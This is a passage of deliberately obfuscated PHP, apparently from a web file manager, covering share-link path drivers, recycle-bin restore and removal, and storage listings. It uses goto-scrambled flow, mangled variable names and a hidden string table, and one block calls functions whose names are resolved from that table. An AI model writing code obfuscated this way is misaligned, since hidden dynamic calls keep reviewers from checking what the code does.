$e“›¬èšŠÊ[$C²£•’µ[468]] : $e“›¬èšŠÊ[$C²£•’µ[75]]); goto EÄŸ°º¨Ôˆ; EÄŸ°º¨Ôˆ: $this->update(); goto F²‹¾×ŒÔä; A¶çø·Æá¼: $C²£•’µ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c˜Œ›´øŠ =& $this->task; $e“›¬èšŠÊ = IO::info($DÂˆî‡ğù); goto E›³›§‚ßº; E›³›§‚ßº: $c˜Œ›´øŠ[$C²£•’µ[1480]] = $e“›¬èšŠÊ[$C²£•’µ[28]]; $c˜Œ›´øŠ[$C²£•’µ[1482]] = $e“›¬èšŠÊ[$C²£•’µ[77]]; $c˜Œ›´øŠ[$C²£•’µ[1483]] = 0; goto E²ñ¥î¯ãÎ; F²‹¾×ŒÔä: } public function unzipAfter($C†´È—Œ) { goto cÜÔƒ­åŒ; Bšá¡ª®„»: $D¨§…šÕ¥— = IO::infoWithChildren($C†´È—Œ); $eè–§——“ = 0; $FçÇ­ªÀá×[$CóÍµÖŠ¶„[1491]] = array($CóÍµÖŠ¶„[1492] => $eè–§——“ + 1, $CóÍµÖŠ¶„[386] => $D¨§…šÕ¥—[$CóÍµÖŠ¶„[28]], $CóÍµÖŠ¶„[75] => $D¨§…šÕ¥—[$CóÍµÖŠ¶„[75]], $CóÍµÖŠ¶„[468] => $D¨§…šÕ¥—[$CóÍµÖŠ¶„[468]] ? $D¨§…šÕ¥—[$CóÍµÖŠ¶„[468]] : $D¨§…šÕ¥—[$CóÍµÖŠ¶„[75]]); goto c‘Ä›ÌçŒ¿; Aš‰Ú“ùŞ½: $FçÇ­ªÀá×[$CóÍµÖŠ¶„[987]] = 0; $FçÇ­ªÀá×[$CóÍµÖŠ¶„[1482]] = 0; $FçÇ­ªÀá×[$CóÍµÖŠ¶„[1483]] = 0; goto eŒÇÉÀÆóŸ; eŒÇÉÀÆóŸ: $FçÇ­ªÀá×[$CóÍµÖŠ¶„[1480]] = $CóÍµÖŠ¶„[33]; $FçÇ­ªÀá×[$CóÍµÖŠ¶„[1487]] = 0; $FçÇ­ªÀá×[$CóÍµÖŠ¶„[692]] = $D¨§…šÕ¥—[$CóÍµÖŠ¶„[77]]; goto c‚£‡‚æÚ…; c‚£‡‚æÚ…: $this->update(); self::log($CóÍµÖŠ¶„[1512] . json_encode(array($FçÇ­ªÀá×, $D¨§…šÕ¥—))); goto bİÅÆ¸‚ß; cÜÔƒ­åŒ: $CóÍµÖŠ¶„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FçÇ­ªÀá× =& $this->task; $FçÇ­ªÀá×[$CóÍµÖŠ¶„[1510]] = $CóÍµÖŠ¶„[103]; goto Bšá¡ª®„»; c‘Ä›ÌçŒ¿: if ($D¨§…šÕ¥—[$CóÍµÖŠ¶„[29]] == $CóÍµÖŠ¶„[167]) { $FçÇ­ªÀá×[$CóÍµÖŠ¶„[973]] = 1; } else { $FçÇ­ªÀá×[$CóÍµÖŠ¶„[973]] = $D¨§…šÕ¥—[$CóÍµÖŠ¶„[80]][$CóÍµÖŠ¶„[78]]; } $FçÇ­ªÀá×[$CóÍµÖŠ¶„[975]] = $CóÍµÖŠ¶„[33]; $FçÇ­ªÀá×[$CóÍµÖŠ¶„[1484]] = 0; goto Aš‰Ú“ùŞ½; bİÅÆ¸‚ß: } public function nameParse($dÌŞéòß†Æ) { goto C”ËíŠ°Æš; B‰ÃÕĞßğ¸: $this->update(); goto f•ÌÄËĞ÷; fÍ …ƒÀ®: $eØÛãø„ = get_path_this($dÌŞéòß†Æ); if (strstr($eØÛãø„, $fïæÆĞ¶¥[91])) { $CÛÃÜÂĞ[$fïæÆĞ¶¥[987]] += 1; $CÛÃÜÂĞ[$fïæÆĞ¶¥[973]] += 1; } $CÛÃÜÂĞ[$fïæÆĞ¶¥[1480]] = $dÌŞéòß†Æ; goto B‰ÃÕĞßğ¸; C”ËíŠ°Æš: $fïæÆĞ¶¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÛÃÜÂĞ =& $this->task; if ($CÛÃÜÂĞ[$fïæÆĞ¶¥[1510]] == $fïæÆĞ¶¥[1037]) { $CÛÃÜÂĞ[$fïæÆĞ¶¥[1510]] = $fïæÆĞ¶¥[301]; $CÛÃÜÂĞ[$fïæÆĞ¶¥[1487]] = 0; $CÛÃÜÂĞ[$fïæÆĞ¶¥[692]] = 0; } goto fÍ …ƒÀ®; f•ÌÄËĞ÷: } } goto eæçÜ‚Ê§ñ; c±ÄÅËÅîá: class PathDriverDbShareLink extends PathDriverDB { public function __construct($B¸Å¡•ŒÇÃ) { $this->pathParse = $B¸Å¡•ŒÇÃ; $this->model = Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1114]); } protected function infoParse($a¦Ò³Š, $c‰Å¨ÑÇïÀ = false, $cƒêöŠİ…ö = false) { $fÚˆíÂÑÍÄ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return Action($fÚˆíÂÑÍÄ[1015])->sharePathInfo($this->pathParse[$fÚˆíÂÑÍÄ[75]], !0); } public function listPath($CÊæŞÈÊ…¿, $a¼´ñŠƒ¢È = false) { $càè¶Ë©À =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÁËÌÜ‡’Ø = parent::listPath($CÊæŞÈÊ…¿, $a¼´ñŠƒ¢È); foreach ($cÁËÌÜ‡’Ø as $D¦ãÀÍÒá™ => $e„ê©õàÃ±) { if (!in_array($D¦ãÀÍÒá™, array($càè¶Ë©À[73], $càè¶Ë©À[74]))) { continue; } foreach ($e„ê©õàÃ± as $B–ˆ¸Â‚É£ => $eŸî›÷öÙ) { $cÁËÌÜ‡’Ø[$D¦ãÀÍÒá™][$B–ˆ¸Â‚É£] = Action($càè¶Ë©À[1015])->shareItemInfo($eŸî›÷öÙ); } } return $cÁËÌÜ‡’Ø; } public function listAll($c¶¬ŒÛãô) { goto b…‘Å†Àˆ; b…‘Å†Àˆ: $D™¾Š†¨¾Œ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D©¤à¦×°Š = IO::info($this->pathParse[$D™¾Š†¨¾Œ[75]]); if (!$D©¤à¦×°Š) { return array(); } goto eœµ•±÷”; d¦ŸòšƒÑ: return $aŞÅ˜éÂß; goto eÂ¾ÄÃç“ã; eœµ•±÷”: $aŞÅ˜éÂß = $this->model->listAll($c¶¬ŒÛãô); foreach ($aŞÅ˜éÂß as &$FœÒò¦É†Œ) { $FœÒò¦É†Œ[$D™¾Š†¨¾Œ[391]] = Action($D™¾Š†¨¾Œ[1015])->shareItemInfo($FœÒò¦É†Œ[$D™¾Š†¨¾Œ[391]]); } unset($FœÒò¦É†Œ); goto d¦ŸòšƒÑ; eÂ¾ÄÃç“ã: } } class PathDriverDriverShareItem { public function __construct($fÎˆ¨¡ÌŞØ) { $this->pathParse = $fÎˆ¨¡ÌŞØ; } public function __call($A’·„È‚ÁÄ, $D—ËùŞö¨¢) { $fˆšéÙˆŒ‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (method_exists($this, $A’·„È‚ÁÄ)) { return; } $fÃµœİé² = call_user_func_array(array($fˆšéÙˆŒ‚[1124], $A’·„È‚ÁÄ), $D—ËùŞö¨¢); $BËš’³¹Å = array($fˆšéÙˆŒ‚[1125], $fˆšéÙˆŒ‚[1126], $fˆšéÙˆŒ‚[1127], $fˆšéÙˆŒ‚[1128], $fˆšéÙˆŒ‚[492], $fˆšéÙˆŒ‚[494], $fˆšéÙˆŒ‚[1129], $fˆšéÙˆŒ‚[103], $fˆšéÙˆŒ‚[1130], $fˆšéÙˆŒ‚[1131]); if (in_array($A’·„È‚ÁÄ, $BËš’³¹Å)) { $fÃµœİé² = $this->getPathOuter($fÃµœİé²); } return $fÃµœİé²; } public function copy($eµİæ±…‘, $bóñ¼¶â¯, $DÕ¿†Â÷İ = false) { return $this->copyMove($eµİæ±…‘, $bóñ¼¶â¯, $DÕ¿†Â÷İ, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][492]); } public function move($aŠ÷…²¾ªó, $cÜ¤„³‹â, $Eœ—Öï¦’÷ = false) { return $this->copyMove($aŠ÷…²¾ªó, $cÜ¤„³‹â, $Eœ—Öï¦’÷, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][494]); } private function copyMove($fĞŒó‚ñ¶Ã, $FÍŸ¬îˆ†, $c‡£’â®‚•, $EâñòÒÇœŞ) { goto A—½áŞ¸¿ù; bÀ±…å: if ($AÜÖêœÌÀ->pathParse[$AˆÑ­ğî›‹[995]]) { $FÍŸ¬îˆ† = $AÜÖêœÌÀ->pathParse[$AˆÑ­ğî›‹[995]]; } else { $FÍŸ¬îˆ† = $eÑ©¬÷ó²ñ; } $B“Äšî›Ì´ = IO::copyMove($fĞŒó‚ñ¶Ã, $FÍŸ¬îˆ†, $c‡£’â®‚•, $EâñòÒÇœŞ); $B“Äšî›Ì´ = $this->getPathOuter($B“Äšî›Ì´); goto aÜ÷íê³Àì; A—½áŞ¸¿ù: $AˆÑ­ğî›‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eÑ©¬÷ó²ñ = $FÍŸ¬îˆ†; $AÜÖêœÌÀ = IO::driverMake($FÍŸ¬îˆ†); goto bÀ±…å; aÜ÷íê³Àì: return $B“Äšî›Ì´; goto dÏî¸Ñ“Ò; dÏî¸Ñ“Ò: } public function pathFather($B­ö˜¡™ğ) { return get_path_father($this->pathParse[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]]); } public function iconvSystem($FëŒ”³ï†„) { return $FëŒ”³ï†„; } protected function infoParse($bï¬ŠïÆ‘Ç, $CêŠÛëƒø = false) { $f–·çœÂÚ‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b¥Š†ŞÙÃ‡ = $this->pathParse[$f–·çœÂÚ‰[439]][$f–·çœÂÚ‰[1016]] . $this->pathParse[$f–·çœÂÚ‰[1009]]; if ($CêŠÛëƒø) { $a•–˜¬Ú™‘ = IO::infoWithChildren($b¥Š†ŞÙÃ‡); } else { $a•–˜¬Ú™‘ = IO::info($b¥Š†ŞÙÃ‡); } $Aâóñƒ›© = $this->pathParse[$f–·çœÂÚ‰[439]]; return Action($f–·çœÂÚ‰[1121])->_shareItemeParse($a•–˜¬Ú™‘, $Aâóñƒ›©); } public function listAll($F£ˆ³ìáè¼) { $f˜ÇÃºŒ¡¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B×ÔÌæˆ¤» = IO::listAll($F£ˆ³ìáè¼); $dÒ³Š©‰Ú = $this->pathParse[$f˜ÇÃºŒ¡¥[439]]; foreach ($B×ÔÌæˆ¤» as &$f—ÌƒéÄµ¦) { check_abort(); $f—ÌƒéÄµ¦ = array_merge(IO::info($f—ÌƒéÄµ¦[$f˜ÇÃºŒ¡¥[75]]), $f—ÌƒéÄµ¦); $f—ÌƒéÄµ¦[$f˜ÇÃºŒ¡¥[391]] = Action($f˜ÇÃºŒ¡¥[1121])->_shareItemeParse($f—ÌƒéÄµ¦, $dÒ³Š©‰Ú); } unset($f—ÌƒéÄµ¦); return $B×ÔÌæˆ¤»; } public function getPathOuter($D»Ë™Ú¤¹‚) { goto e¥¥®ÏÓ†; E™¹‰º÷ø: $fÉ…´òíŒ = KodIO::clear($D»Ë™Ú¤¹‚); $eÖÜæÄ×é = KodIO::clear($this->pathParse[$FÄÕÙ¢áá[439]][$FÄÕÙ¢áá[1016]]); $bæÜ«Š®ñÙ = substr($fÉ…´òíŒ, strlen($eÖÜæÄ×é)); goto cÒ‚ã‹ÀÁ; cÒ‚ã‹ÀÁ: if (substr($fÉ…´òíŒ, 0, strlen($eÖÜæÄ×é)) != $eÖÜæÄ×é) { return !1; } return $this->pathParse[$FÄÕÙ¢áá[1010]] . $FÄÕÙ¢áá[8] . ltrim($bæÜ«Š®ñÙ, $FÄÕÙ¢áá[8]); goto bá©õÉâÚï; e¥¥®ÏÓ†: $FÄÕÙ¢áá =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c´ƒËÀ¡£§ = KodIO::parse($D»Ë™Ú¤¹‚); if ($c´ƒËÀ¡£§[$FÄÕÙ¢áá[29]] == KodIO::KOD_SHARE_ITEM) { return $c´ƒËÀ¡£§[$FÄÕÙ¢áá[75]]; } goto E™¹‰º÷ø; bá©õÉâÚï: } public function getType() { $d§§†¶ˆ¨´ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E†¾ë¥‹ÓŞ = str_replace($d§§†¶ˆ¨´[71], $d§§†¶ˆ¨´[33], get_class($this)); return strtolower($E†¾ë¥‹ÓŞ); } public function isTypeObject($b…½‘–Ù–) { return IO::isTypeObject($b…½‘–Ù–); } public function info($Càáñˆ±¨®) { return $this->infoParse($Càáñˆ±¨®); } public function infoAuth($c² ò¼İÕ) { return $this->infoParse($c² ò¼İÕ); } public function infoWithChildren($cˆÛ‰éĞä) { return $this->infoParse($cˆÛ‰éĞä, !0); } public function infoFull($dŞ©‘ˆ—Ö) { return $this->infoParse($dŞ©‘ˆ—Ö); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ağ˜”Â‡¦ƒ) { $this->pathParse = $ağ˜”Â‡¦ƒ; } protected function infoParse($C‚“óöƒ¤, $b«µ©¤øê = false) { $E¾š†ñç¤ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return Action($E¾š†ñç¤[1015])->sharePathInfo($this->pathParse[$E¾š†ñç¤[75]], !0, $b«µ©¤øê); } public function listPath($B»ùÎ‘÷Ò®, $A£•ÍæùìÀ = false) { $cäì¥™¦·§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b›Ó‡¬…° = IO::listPath($B»ùÎ‘÷Ò®, $A£•ÍæùìÀ); foreach ($b›Ó‡¬…° as $e›ÅîÖŞ => $e¦Ò®ÁñŸÓ) { if (!in_array($e›ÅîÖŞ, array($cäì¥™¦·§[73], $cäì¥™¦·§[74]))) { continue; } foreach ($e¦Ò®ÁñŸÓ as $eÃØÑßé»Ã => $b×Ö¨ôöª±) { $b×Ö¨ôöª± = Action($cäì¥™¦·§[1132])->parsePathChildren($b×Ö¨ôöª±, array($cäì¥™¦·§[387] => $B»ùÎ‘÷Ò®)); $b›Ó‡¬…°[$e›ÅîÖŞ][$eÃØÑßé»Ã] = Action($cäì¥™¦·§[1015])->shareItemInfo($b×Ö¨ôöª±); } } return $b›Ó‡¬…°; } public function listAll($aæ‰ŠµÚÏó) { $E¾ÅÌË…óˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eœã©­áã = IO::listAll($aæ‰ŠµÚÏó); foreach ($eœã©­áã as &$f¤¢™öÚ›) { $f¤¢™öÚ› = array_merge(IO::info($f¤¢™öÚ›[$E¾ÅÌË…óˆ[75]]), $f¤¢™öÚ›); $f¤¢™öÚ›[$E¾ÅÌË…óˆ[391]] = Action($E¾ÅÌË…óˆ[1015])->shareItemInfo($f¤¢™öÚ›); } unset($f¤¢™öÚ›); return $eœã©­áã; } } goto BæÚ†Èò…Í; FŸÓ‰ÊËíï: if ($_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][703]] != $e°¿êŞëİ•($c‹ìºÁ‚«)) { goto F–ùğÑËÓ†; F–ùğÑËÓ†: $Bï±‰¹£ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][705]; $BÊà°†Ê§Ğ = $_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][706]] . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][707]; $dô†‹ÊÁ§ô = $Bï±‰¹£($BÊà°†Ê§Ğ); goto E¿ÊÇÎ½¬›; fÛ•“§×ŠŞ: $eá…½Œœ‘($c‹ìºÁ‚«); goto BŞï¶ÌèÙ; E¿ÊÇÎ½¬›: $A‘¶äèÛË¹ = explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][217], $dô†‹ÊÁ§ô); if (count($A‘¶äèÛË¹) < $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][562]) { $Eø‹¾ë˜ÙÔ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][708]; $Eø‹¾ë˜ÙÔ(); } $eá…½Œœ‘ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][709]; goto fÛ•“§×ŠŞ; BŞï¶ÌèÙ: } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\x63\145\137\x72\x65\x63\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\x54\x69\155\x65", "\164\x69\x6d\x65", "\151\x6e\x73\145\x72\164", "\146\x75\x6e\x63\164\x69\x6f\156")); public function listData($cÏíØŠåÆ° = false) { $D‡˜ÎĞ™Ş =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÏíØŠåÆ° = $cÏíØŠåÆ° ? $cÏíØŠåÆ° : USER_ID; $eóè³Êƒ—¸ = $this->where(array($D‡˜ÎĞ™Ş[1428] => $cÏíØŠåÆ°))->select(); return array_to_keyvalue($eóè³Êƒ—¸, $D‡˜ÎĞ™Ş[33], $D‡˜ÎĞ™Ş[369]); } public function moveToRecycle($eº¶ë¡Ê¦¾) { goto F«¬Şäš“; CÀ‰´šÑ ë: $this->recycleMove($eº¶ë¡Ê¦¾, 1); if ($dá¥É’¼Ÿß[$Cî…£îÊÀŒ[370]] == $Cî…£îÊÀŒ[83]) { $A–›Ï†·‡¶ = array($Cî…£îÊÀŒ[527] => array($Cî…£îÊÀŒ[485], $dá¥É’¼Ÿß[$Cî…£îÊÀŒ[461]] . $eº¶ë¡Ê¦¾ . $Cî…£îÊÀŒ[486])); $aßòì£‰â->where($A–›Ï†·‡¶)->setField($Cî…£îÊÀŒ[397], 1); } goto cø¢Ö‡êèÖ; F«¬Şäš“: $Cî…£îÊÀŒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aßòì£‰â = Model($Cî…£îÊÀŒ[1114]); $dá¥É’¼Ÿß = $aßòì£‰â->sourceInfo($eº¶ë¡Ê¦¾); goto B©—¬¯“™æ; B©—¬¯“™æ: if (!$dá¥É’¼Ÿß || $dá¥É’¼Ÿß[$Cî…£îÊÀŒ[397]] == $Cî…£îÊÀŒ[83]) { return; } $E’à±¹øƒé = array($Cî…£îÊÀŒ[383] => $eº¶ë¡Ê¦¾, $Cî…£îÊÀŒ[1428] => USER_ID, $Cî…£îÊÀŒ[523] => $dá¥É’¼Ÿß[$Cî…£îÊÀŒ[371]], $Cî…£îÊÀŒ[524] => $dá¥É’¼Ÿß[$Cî…£îÊÀŒ[458]], $Cî…£îÊÀŒ[527] => $dá¥É’¼Ÿß[$Cî…£îÊÀŒ[461]]); $this->add($E’à±¹øƒé); goto CÀ‰´šÑ ë; cø¢Ö‡êèÖ: } public function clear() { $this->remove(!1); } public function remove($dîÎĞ¼ö°¤ = false) { goto c•†öÔ„®; Aëà˜¼ë±: $dîÎĞ¼ö°¤ = $dîÎĞ¼ö°¤ === !1 ? !1 : $dîÎĞ¼ö°¤; $fÎëƒ¯è†Û = array(); foreach ($DåÊŒ©Û¨ã as $C÷Œ¸…ŒŠÑ) { if ($dîÎĞ¼ö°¤ != !1 && !in_array($C÷Œ¸…ŒŠÑ, $dîÎĞ¼ö°¤)) { continue; } $dãÓ­ÍŞÉ‡ = $DğŠ‘ÑÂ†§->sourceInfo($C÷Œ¸…ŒŠÑ); $DğŠ‘ÑÂ†§->remove($C÷Œ¸…ŒŠÑ, !1); $BñŸÓ’ÉÆÆ = $dãÓ­ÍŞÉ‡[$C²†‚¢µ½[371]] . $C²†‚¢µ½[70] . $dãÓ­ÍŞÉ‡[$C²†‚¢µ½[458]]; $fÎëƒ¯è†Û[$BñŸÓ’ÉÆÆ] = array($C²†‚¢µ½[523] => $dãÓ­ÍŞÉ‡[$C²†‚¢µ½[371]], $C²†‚¢µ½[458] => $dãÓ­ÍŞÉ‡[$C²†‚¢µ½[458]]); $this->where(array($C²†‚¢µ½[369] => $C÷Œ¸…ŒŠÑ))->delete(); } goto b…²Öˆá—Œ; c•†öÔ„®: $C²†‚¢µ½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DğŠ‘ÑÂ†§ = Model($C²†‚¢µ½[1114]); $DåÊŒ©Û¨ã = $this->listData(); goto Aëà˜¼ë±; b…²Öˆá—Œ: foreach ($fÎëƒ¯è†Û as $A­·ÏËªí¬) { $DğŠ‘ÑÂ†§->targetSpaceUpdate($A­·ÏËªí¬[$C²†‚¢µ½[371]], $A­·ÏËªí¬[$C²†‚¢µ½[458]]); } goto F‘Ã‘ä²¾; F‘Ã‘ä²¾: } public function restore($BÚëñÔ«Ì¤ = false) { goto B‡Ü·ëÎ¤‘; B‡Ü·ëÎ¤‘: $Aø‘®²ÀŸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fõ˜Œ„çäª = Model($Aø‘®²ÀŸ[1114]); $fŒÇÄ® = $this->listData(); goto D­ÚÑ™‘“Ó; f‘œ×Ìù‘Ü: foreach ($fŒÇÄ® as $C¨æ…ÜŸŞ›) { goto FŠ¨ÒÅ³¬ˆ; FŠ¨ÒÅ³¬ˆ: if ($BÚëñÔ«Ì¤ != !1 && !in_array($C¨æ…ÜŸŞ›, $BÚëñÔ«Ì¤)) { continue; } $Dç¿Áø“ï = $Fõ˜Œ„çäª->sourceInfo($C¨æ…ÜŸŞ›); $c·†ñÑÔß« = $Fõ˜Œ„çäª->sourceInfo($Dç¿Áø“ï[$Aø‘®²ÀŸ[463]]); goto f‹äÉÇ™; fÄòÖáˆï‡: if ($Dç¿Áø“ï[$Aø‘®²ÀŸ[370]] == $Aø‘®²ÀŸ[83]) { $CÅ£êã–¨„ = array($Aø‘®²ÀŸ[527] => array($Aø‘®²ÀŸ[485], $Dç¿Áø“ï[$Aø‘®²ÀŸ[461]] . $C¨æ…ÜŸŞ› . $Aø‘®²ÀŸ[486])); $Fõ˜Œ„çäª->where($CÅ£êã–¨„)->setField($Aø‘®²ÀŸ[397], 0); $this->restoreFolderChildren($C¨æ…ÜŸŞ›, $fŒÇÄ®); } $this->where(array($Aø‘®²ÀŸ[369] => $C¨æ…ÜŸŞ›))->delete(); $Fõ˜Œ„çäª->folderSizeReset($Dç¿Áø“ï[$Aø‘®²ÀŸ[463]]); goto Aì¼œ›¯š¬; Aì¼œ›¯š¬: $CˆàŒÊàÑ±[] = $Dç¿Áø“ï[$Aø‘®²ÀŸ[463]]; if ($Dç¿Áø“ï[$Aø‘®²ÀŸ[370]] == $Aø‘®²ÀŸ[83]) { $CˆàŒÊàÑ±[] = $C¨æ…ÜŸŞ›; } $Fõ˜Œ„çäª->lockMoveEnd($C¨æ…ÜŸŞ›); goto ağÚˆõí”; f‹äÉÇ™: if ($c·†ñÑÔß«[$Aø‘®²ÀŸ[397]] == $Aø‘®²ÀŸ[83]) { continue; } $Fõ˜Œ„çäª->lockMoveStart($C¨æ…ÜŸŞ›); $this->recycleMove($C¨æ…ÜŸŞ›, 0); goto fÄòÖáˆï‡; ağÚˆõí”: } $Fõ˜Œ„çäª->updateModifyTime($CˆàŒÊàÑ±); goto cÕÏÑƒÃæ‡; D­ÚÑ™‘“Ó: $BÚëñÔ«Ì¤ = $BÚëñÔ«Ì¤ == !1 ? !1 : $BÚëñÔ«Ì¤; if (!$fŒÇÄ®) { return !0; } $CˆàŒÊàÑ± = array(); goto f‘œ×Ìù‘Ü; cÕÏÑƒÃæ‡: } private function restoreFolderChildren($B®ôº’é, $bôÁÚº¹ÊÎ) { goto B…¤ôÏµĞ‰; B…¤ôÏµĞ‰: $bÃËòˆíø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bå«¹ñ²ö = Model($bÃËòˆíø[1114]); $eåÏøÍçÉ‚ = array($bÃËòˆíø[369] => array($bÃËòˆíø[7], array())); goto A®Ù¡º…‚; A®Ù¡º…‚: foreach ($bôÁÚº¹ÊÎ as $C¹Ï•ò°­Ù) { if ($C¹Ï•ò°­Ù == $B®ôº’é) { continue; } if (!$Bå«¹ñ²ö->isParentOf($B®ôº’é, $C¹Ï•ò°­Ù)) { continue; } $B¬–À”àÍŞ = $Bå«¹ñ²ö->sourceInfo($C¹Ï•ò°­Ù); if ($B¬–À”àÍŞ[$bÃËòˆíø[370]] == $bÃËòˆíø[83]) { $eåÏøÍçÉ‚[] = array($bÃËòˆíø[527] => array($bÃËòˆíø[485], $B¬–À”àÍŞ[$bÃËòˆíø[461]] . $C¹Ï•ò°­Ù . $bÃËòˆíø[486])); } else { $eåÏøÍçÉ‚[$bÃËòˆíø[369]][1][] = $C¹Ï•ò°­Ù; } } if (!$eåÏøÍçÉ‚[$bÃËòˆíø[369]][1]) { unset($eåÏøÍçÉ‚[$bÃËòˆíø[369]]); } if (!$eåÏøÍçÉ‚) { return; } goto eÂ¸Û¨×‰†; eÂ¸Û¨×‰†: $eåÏøÍçÉ‚[$bÃËòˆíø[369]][1] = array_unique($eåÏøÍçÉ‚[$bÃËòˆíø[369]][1]); $eåÏøÍçÉ‚[$bÃËòˆíø[910]] = $bÃËòˆíø[2193]; $Bå«¹ñ²ö->where($eåÏøÍçÉ‚)->setField($bÃËòˆíø[397], 1); goto eƒ‡ÌÍ; eƒ‡ÌÍ: } private function recycleMove($B¨™ƒ¤µ™Û, $bîç ¹º† = 1) { $f‘¦‡á²å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b•ª»î¸‡é = Model($f‘¦‡á²å[1114]); $BŠäÁ³¢îë = Model($f‘¦‡á²å[2394]); $Bù”¯ÅÜ  = array($f‘¦‡á²å[369] => $B¨™ƒ¤µ™Û); if ($bîç ¹º†) { $b•ª»î¸‡é->where($Bù”¯ÅÜ )->setField($f‘¦‡á²å[397], 1); $BŠäÁ³¢îë->eventRecycle($B¨™ƒ¤µ™Û, $f‘¦‡á²å[2395]); } else { $CÉ‹›É±¨ = $b•ª»î¸‡é->where($Bù”¯ÅÜ )->find(); $dÃ÷·®îÕ = $CÉ‹›É±¨[$f‘¦‡á²å[370]] == $f‘¦‡á²å[83]; $AÇø”ˆšë‘ = $b•ª»î¸‡é->fileNameAuto($CÉ‹›É±¨[$f‘¦‡á²å[463]], $CÉ‹›É±¨[$f‘¦‡á²å[28]], REPEAT_RENAME_FOLDER, $dÃ÷·®îÕ); if ($AÇø”ˆšë‘ != $CÉ‹›É±¨[$f‘¦‡á²å[28]]) { $b•ª»î¸‡é->rename($B¨™ƒ¤µ™Û, $AÇø”ˆšë‘); } $b•ª»î¸‡é->where($Bù”¯ÅÜ )->setField($f‘¦‡á²å[397], 0); $BŠäÁ³¢îë->eventRecycle($B¨™ƒ¤µ™Û, $f‘¦‡á²å[2396]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\163\164\157\162\141\147\145\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\151\172\x65\115\141\x78", "\163\171\163\164\x65\155", "\144\x65\146\141\x75\154\164", "\x64\162\151\166\145\162", "\143\x6f\x6e\146\151\x67"); public function listData($DØ”¿…õšì = false, $F‹æ®‚ŸÔ = "\155\x6f\x64\x69\146\x79\124\151\155\145", $aÏ„«ÒïŸ = false) { goto cÏâ³´•‚; E¿ºêÌôÌ: return $C–íœİ£µ; goto b²Ë©˜Ûè²; cÏâ³´•‚: $aïùÑéÅ  =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C–íœİ£µ = parent::listData($DØ”¿…õšì, $F‹æ®‚ŸÔ, $aÏ„«ÒïŸ); if ($DØ”¿…õšì) { return $C–íœİ£µ; } goto D¡””Ú×¬ß; D¡””Ú×¬ß: foreach ($C–íœİ£µ as $d¤éïµƒªª => $e† Ôë“Ï) { unset($C–íœİ£µ[$d¤éïµƒªª][$aïùÑéÅ [6]]); $C–íœİ£µ[$d¤éïµƒªª][$aïùÑéÅ [2094]] = 0; } $B¶ƒ¨¾·ãô = array_to_keyvalue($C–íœİ£µ, $aïùÑéÅ [33], $aïùÑéÅ [367]); $this->_listAppendSize($C–íœİ£µ, $B¶ƒ¨¾·ãô); goto E¿ºêÌôÌ; b²Ë©˜Ûè²: } public function _listAppendSize(&$A…æŒ·Í„’, $B©ö–ñµ±ª) { $a¬ñ¦Œ±«¢ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$B©ö–ñµ±ª) { return; } $Aïª‚ÖÔ»á = $a¬ñ¦Œ±«¢[2397] . implode($a¬ñ¦Œ±«¢[47], $B©ö–ñµ±ª) . $a¬ñ¦Œ±«¢[2398]; $FÛïâŞ­ºÎ = Model($a¬ñ¦Œ±«¢[720])->query($Aïª‚ÖÔ»á); $FÛïâŞ­ºÎ = array_to_keyvalue($FÛïâŞ­ºÎ, $a¬ñ¦Œ±«¢[367], $a¬ñ¦Œ±«¢[77]); foreach ($A…æŒ·Í„’ as $bÚÉäö„ê­ => $A¡™®Ã…Ùµ) { $A…æŒ·Í„’[$bÚÉäö„ê­][$a¬ñ¦Œ±«¢[2094]] = isset($FÛïâŞ­ºÎ[$A¡™®Ã…Ùµ[$a¬ñ¦Œ±«¢[367]]]) ? $FÛïâŞ­ºÎ[$A¡™®Ã…Ùµ[$a¬ñ¦Œ±«¢[367]]] : 0; } } public function getConfig($cÑ³ŒÚ’éá) { $dƒÓÁåªğÄ = parent::listData($cÑ³ŒÚ’éá); return json_decode($dƒÓÁåªğÄ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][6]], !0); } public function update($FÔ­··äÍŸ, $e½Šî¼˜¤â) { goto 